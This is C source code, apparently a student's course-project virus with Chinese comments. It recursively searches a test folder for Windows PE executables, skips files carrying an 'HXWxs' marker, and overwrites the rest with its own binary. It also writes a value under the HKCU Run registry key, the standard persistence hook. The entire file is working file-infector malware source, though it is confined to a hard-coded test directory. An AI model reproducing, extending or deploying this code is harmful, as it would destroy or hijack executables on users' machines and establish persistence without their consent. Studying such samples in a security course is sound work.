/*This is a flag:start*/
#include<stdio.h>
#include<io.h>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>
//#include<dir.h>

//#define Targetfile "*.*"
int is_exe(FILE* fd);
void InfectFile(void);
void copyfile(char* infile, char* outfile);
int is_injected(FILE* fd);
int find_source();
int infect_folder(char folder_name[1000]);
int set_key();
/*全局变量*/
char dir[100]; //用来存储病毒的自身路径以做感染使用 

void copyfile(char* infile, char* outfile)
{
	//FILE* in, * out;
	//printf("%s\n%s\n",infile,outfile);
	//fopen_s(&in,infile, "rb");
	//fopen_s(&out,outfile, "wb");
	/*while (!feof(in))
	//{
		fputc(fgetc(in), out);
	}*/
	//fclose(in);
	//fclose(out);
	WCHAR In[256];
	WCHAR Out[256];
	memset(In, 0, sizeof(In));
	memset(Out, 0, sizeof(Out));
	MultiByteToWideChar(CP_ACP, 0, infile, strlen(infile) + 1,In,sizeof(In) / sizeof(In[0]));
	MultiByteToWideChar(CP_ACP, 0, outfile, strlen(outfile) + 1, Out, sizeof(Out) / sizeof(Out[0]));
	CopyFile(In, Out, FALSE);
	printf("%s is infected!\n", outfile);
}


/*This is a flag:end*/
int main(void)
{
	/*实现自我定位的功能，并将文件存储到*/
	char first_dir[100];
	strcpy_s(first_dir, "D:\\virus_test");
	//_getcwd(dir, 100);
	//进行文件夹的遍历，寻找病毒的源泉 
	//strcat_s(dir, "\\");
	/*if (find_source() == 1) {
		printf("病毒宿主所在路径为：%s\n\n\n", dir);
	}
	else return 0;*/
	//printf("%s\n", dir);
	strcpy_s(dir, "C:\\Users\\芙茗\\Desktop\\软件安全课设\\TestCode\\virus1\\Debug\\Project1.exe");
	if (set_key() == 1);//printf("set key successfully!\n");
	//_getcwd(first_dir, 100);
	infect_folder(first_dir);
	//printf("This is HXWxs!");
	system("pause");
	return 0;
}

int find_source() {
	/*实现自我定位的功能，并将病毒的路径存储进入dir中*/
	struct _finddata_t ffblk;
	char documenttype[10] = "*.*";
	int done = _findfirst(documenttype, &ffblk);
	if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0 && strstr(ffblk.name, ".") != NULL) {
		FILE* fp;
		fopen_s(&fp,ffblk.name, "rb");
		int h = is_exe(fp);
		int x = is_injected(fp);
		printf("%s %d %d \n\n", ffblk.name, h, x);
		if (h && (!x)) {
			strcat_s(dir, ffblk.name);
			return 1;
		}
	}
	while (!_findnext(done, &ffblk)) {
		if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0 && strstr(ffblk.name, ".") != NULL) {
			FILE* fp;
			fopen_s(&fp,ffblk.name, "rb");
			int h = is_exe(fp);
			int x = is_injected(fp);
			printf("%s %d %d \n\n", ffblk.name, h, x);
			if (h && (!x)) {
				strcat_s(dir, ffblk.name);
				return 1;
			}
		}
	}
	return 0;
}

int is_exe(FILE* fd) {//判断是否是可执行文件
	char dos_mark[3];
	long address_of_nt_header;
	long offset = 0x3c;
	char nt_mark[3];
	if (fd == NULL)
		return 0;
	fgets(dos_mark, 3, fd);
	if (strcmp(dos_mark, "MZ"))
		return 0;
	fseek(fd, offset, SEEK_SET);
	fread(&address_of_nt_header, 4, 1, fd);
	fseek(fd, address_of_nt_header, SEEK_SET);
	fgets(nt_mark, 3, fd);
	if (strcmp(nt_mark, "PE"))
		return 0;
	return 1;
}

int is_injected(FILE* fd) {//判断是否被感染	
	long offset = 0x7d98;
	char mark[6];
	int nt_offset = 0;
	int mark_offset = 0;

	fseek(fd, offset, SEEK_SET);
	fread(mark, 5, 1, fd);
	mark[5] = '\0';
	if (strcmp(mark, "HXWxs") == 0) {
		//printf("match!\n");
		return 0;
	}
	//printf("not match!\n");
	return 1;
}
//进行一个相应的遍历操作的设置，深度优先遍历
//infect_file应该是一个递归函数的形式，如何来进行递归呢？
//以文件夹为单位进行递归，传递的是文件夹的前面的名称 
int infect_folder(char folder_name[1000]) {
	char target[1000];//作为过滤的条件 
	char subfolder[1000];
	char file[1000];
	strcpy_s(target, folder_name);
	strcat_s(target, "\\*.*");
	//printf("当前文件夹为：%s-----------------\n", folder_name);
	int done;
	/*遍历当前的一个文件夹，进行相应的搜索*/
	struct _finddata_t ffblk;
	char* documenttype = target;
	done = _findfirst(documenttype, &ffblk);
	if (done == -1) {
		return 0;
	}
	if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0) {
		FILE* fp;
		if (strstr(ffblk.name, ".") == NULL) {
			strcpy_s(subfolder, folder_name);
			strcat_s(subfolder, "\\");
			strcat_s(subfolder, ffblk.name);
			//printf("%s dir\n", subfolder);
			infect_folder(subfolder);//进一步感染子文件夹中的文件 
		}
		else {
			strcpy_s(file, folder_name);
			strcat_s(file, "\\");
			strcat_s(file, ffblk.name);
			if (strcmp(ffblk.name, "MFCApplication2.exe") != 0 && strcmp(ffblk.name, "MFCApplocation2.ilk") != 0 && strcmp(ffblk.name, "MFCApplocation2.pdb") != 0) {
				fopen_s(&fp,file, "rb");
				int h = is_exe(fp);
				int x = is_injected(fp);
				//printf("%s %d %d \n", file, h, x);
				if (h && x) {
					copyfile(dir, file);
					//printf("it has been infected!\n");
				}
			}
		}
	}
	while (!_findnext(done, &ffblk))
	{
		if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0) {
			FILE* fp;
			if (strstr(ffblk.name, ".") == NULL) {
				strcpy_s(subfolder, folder_name);
				strcat_s(subfolder, "\\");
				strcat_s(subfolder, ffblk.name);
				//printf("%s dir\n", subfolder);
				infect_folder(subfolder);//进一步感染子文件夹中的文件 
			}
			else {
				strcpy_s(file, folder_name);
				strcat_s(file, "\\");
				strcat_s(file, ffblk.name);
				if (strcmp(ffblk.name, "MFCApplication2.exe") != 0 && strcmp(ffblk.name, "MFCApplocation2.ilk") != 0 && strcmp(ffblk.name, "MFCApplocation2.pdb") != 0) {
					fopen_s(&fp,file, "rb");
					int h = is_exe(fp);
					int x = is_injected(fp);
					//printf("%s %d %d \n", file, h, x);
					if (h && x) {
						copyfile(dir, file);
						//printf("it has been infected!\n");
					}
				}
			}
		}
	}
	_findclose(done);
	return 0;
}


int set_key()
{
	//找到系统的启动项 	
	//char *szSubKey= "Software\\Microsoft\\Windows\\CurrentVersion\\Run";	
	HKEY hKey;
	//打开注册表启动项 	
	//HKEY hKey;
	size_t ret = RegCreateKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS, NULL, &hKey, NULL);
	TCHAR Data[254];
	memset(Data, 0, sizeof(Data));
	wcsncpy_s(Data, TEXT("success\0"), 254);
	size_t iLen = wcslen(Data);
	ret = RegSetValueEx(hKey, L"test5", 0, REG_SZ, (CONST BYTE*)Data, sizeof(TCHAR) * iLen);
	if (ret == ERROR_SUCCESS)
	{
		//printf("set value successfully!\n");
	}
	return 1;
}